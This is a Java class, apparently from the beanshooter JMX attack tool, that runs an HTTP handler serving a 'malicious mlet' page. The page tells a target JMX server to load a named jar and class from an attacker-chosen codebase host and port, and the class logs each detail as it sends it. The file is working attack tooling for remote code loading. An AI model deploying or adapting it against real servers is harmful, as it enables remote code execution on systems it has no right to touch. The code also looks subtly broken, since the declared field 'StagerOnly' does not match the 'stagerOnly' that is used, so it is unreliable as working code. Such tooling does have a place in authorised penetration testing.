package de.qtc.beanshooter.utils;

import java.io.IOException;
import java.io.OutputStream;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;

import de.qtc.beanshooter.io.Logger;


public class MLetHandler implements HttpHandler {

    String host = null;
    String port = null;
    String jarName = null;
    String mBeanClass = null;
    String objectName = null;
    boolean StagerOnly = false;

    public MLetHandler(String host, String port, String beanClass, String jarName, String objectName, boolean stagerOnly)
    {
        this.host = host;
        this.port = port;
        this.jarName = jarName;
        this.mBeanClass = beanClass;
        this.objectName = objectName;
        this.stagerOnly = stagerOnly;
    }

    public void handle(HttpExchange t) throws IOException
    {
        if( stagerOnly )
            System.out.println("");

        Logger.print("Received request for: ");
        Logger.eprintlnPlain_ye("/mlet");

        String response = "<HTML><mlet code=\"%s\" archive=\"%s\" name=\"%s\" codebase=\"http://%s:%s\"></mlet></HTML>";
        response = String.format(response, this.mBeanClass, this.jarName, this.objectName, this.host, this.port);

        Logger.println("Sending malicious mlet:");
        Logger.println("");
        Logger.increaseIndent();

        Logger.print("Class:\t\t");
        Logger.printlnPlain_bl(this.mBeanClass);

        Logger.print("Archive:\t");
        Logger.printlnPlain_bl(this.jarName);

        Logger.print("Object:\t\t");
        Logger.printlnPlain_bl(this.objectName);

        Logger.print("Codebase:\t");
        Logger.printlnPlain_bl("http://" + this.host + ":" + this.port);

        Logger.println("");
        Logger.decreaseIndent();

        t.sendResponseHeaders(200, response.length());
        OutputStream os = t.getResponseBody();
        os.write(response.getBytes());
        os.close();
    }
}
